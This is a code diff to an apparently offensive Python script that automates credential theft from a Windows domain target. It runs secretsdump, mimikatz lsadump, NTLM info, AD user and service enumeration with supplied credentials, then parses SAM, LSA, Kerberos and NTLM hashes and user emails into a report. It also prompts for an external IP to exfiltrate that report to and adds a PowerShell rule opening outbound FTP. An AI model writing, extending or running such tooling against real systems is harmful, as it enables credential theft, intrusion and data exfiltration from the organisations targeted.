@@ -1,6 +1,7 @@
 import argparse
 import socket
 import os
+import re
 
 # Setup arg passing
 parser = argparse.ArgumentParser("", formatter_class=argparse.RawTextHelpFormatter)
@@ -46,6 +47,7 @@ def get_domain_name(filepath):
 def get_NTML_hash(filepath):
     try:
         with open(filepath, 'r') as f, open('./output.txt', 'a') as of:
+            of.write(f"Mimikatz output:\n")
             for line in f:
                 if line.strip().startswith('RID  :') or line.strip().startswith('User :'):
                     of.write(line.strip() + "\n")
@@ -116,20 +118,77 @@ def process_secrets_dump(filepath):
                 kerberos_info.append(line.strip())
     try:
         with open('./output.txt', 'w') as of:
-            of.write("Local SAM Hashes:\n")
+            if sam_hashes:
+                of.write("Local SAM Hashes:\n")
             for hash in sam_hashes:
                 of.write(f"{hash}\n")
-            of.write("\nLSA Secrets:\n")
+            if lsa_hashes:
+                of.write("\nLSA Secrets:\n")
             for lsahash in lsa_hashes:
                 of.write(f"{lsahash}\n")
-            of.write("\nDomains:\n")
+            if domain_hashes:
+                of.write("\nDomains:\n")
             for domainhash in domain_hashes:
                 of.write(f"{domainhash}\n")
-            of.write("\nKerberos keys:\n")
+            if kerberos_info:
+                of.write("\nKerberos keys:\n")
             for key in kerberos_info:
                 of.write(f"{key}\n")
+            of.write(f"\n")
     except Exception as e:
         print(f"Error: {e}")
+
+def get_ad_users(filepath):
+    pattern = r"(-+(\s+-+)+)"
+    all_info = []
+    found_start = False
+    with open(filepath, 'r') as file:
+        for line in file:
+            if re.match(pattern, line):
+                found_start = True
+                continue
+            if found_start is True:
+                all_info.append((line.split()))
+    with open('./output.txt', 'a') as of:
+        of.write(f"\nAD user info:\n")
+        for info in all_info:
+            of.write(f"User:\n")
+            of.write(f"{info[0]}\n")
+            if "@" in info[1]:
+                of.write(f"   {info[0]}'s email: {info[1]}\n")
+            else:
+                continue
+
+def get_services(filepath):
+    start_string = "[*] Listing services available on target"
+    found_start = False
+    services = []
+    with open(filepath, 'r') as file:
+        for line in file:
+            if start_string in line:
+                found_start = True
+                continue
+            if found_start is True:
+                if "RUNNING" in line.strip():
+                    services.append(line.strip())
+    with open('./output.txt', 'a') as of:
+        of.write(f"\nRunning Services:\n")
+        of.write(f"Service name - Service description\n")
+        for service in services:
+            service = (re.sub(r'\s+', ' ', service)).strip(" - RUNNING")
+            of.write(f"{service}\n")
+        of.write("\n")
+
+
+# Get the IP of the target machine.
+while validTargetIP is False:
+    targetIP = input("Enter the IP of the target system\n")
+    try:
+        socket.inet_aton(targetIP)
+        validTargetIP = True
+    except socket.error:
+        targetIP = input("The target IP you entered is not valid, please try again.\n")
+
 
 # Find out if the report should be exfiltrated
 exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")
@@ -151,45 +210,41 @@ if exfilBool is True:
             validExfilIP = True
         except socket.error:
             exfilBool = input("The IP address entered was not valid, please try again.\n")
-
-# Get the IP of the target machine.
-while validTargetIP is False:
-    targetIP = input("Enter the IP of the target system\n")
-    try:
-        socket.inet_aton(targetIP)
-        validTargetIP = True
-    except socket.error:
-        targetIP = input("The target IP you entered is not valid, please try again.\n")
+    # Add outbound firewall rule for FTP
+    os.system("powershell New-NetFirewallRule -DisplayName 'FTP-Outbound' -Profile @('Domain', 'Private', 'Public')"
+              " -Direction Outbound -Action Allow -Protocol TCP -LocalPort @(21)")
 
 # Run the secretsdump script, saves to file
-# FIND A WAY TO CREATE FOLDER TO SAVE TO.
-secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\secOutput.txt"
+secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} > .\\secOutput.txt"
 
 os.system(secCommand)
 
 # Use the process function and see if it works to filter out useless info. Needs input path
-process_secrets_dump("c:\\temp\\secOutput.txt")
+process_secrets_dump("./secOutput.txt")
 
 # Dump the NTLM Info
-dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} >> c:\\temp\\NTLMInfo.txt"
+dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} > .\\NTLMInfo.txt"
 os.system(dumpNTLMCommand)
 
-domain_name = get_domain_name("c:\\temp\\NTLMInfo.txt")
+domain_name = get_domain_name("./NTLMInfo.txt")
 
 # Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
 mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
-              f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt"
+              f"{domain}/{username}:{password}@{targetIP} > .\\mimiOutput.txt"
 os.system(mimiCommand)
 
 # Extract key info to output text file.
-get_NTML_hash("c:\\temp\\mimiOutput.txt")
-
-# Run services.py script.
-servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP} list >> c:\\temp\\servicesOutput.txt"
-os.system(servicesCommand)
+get_NTML_hash(".\\mimiOutput.txt")
 
 # Run ADUsers script.
 ADUsersCommand = (f"py {getADUsers_path} -all -dc-ip {targetIP} {domain_name}/{username}:{password}"
-                  f" >> c:\\temp\\ADUsersOutput.txt")
+                  f" > .\\ADUsersOutput.txt")
 os.system(ADUsersCommand)
+get_ad_users(".\\ADUsersOutput.txt")
+
+
+# Run services.py script.
+servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP} list > .\\servicesOutput.txt"
+os.system(servicesCommand)
+get_services(".\\servicesOutput.txt")
 
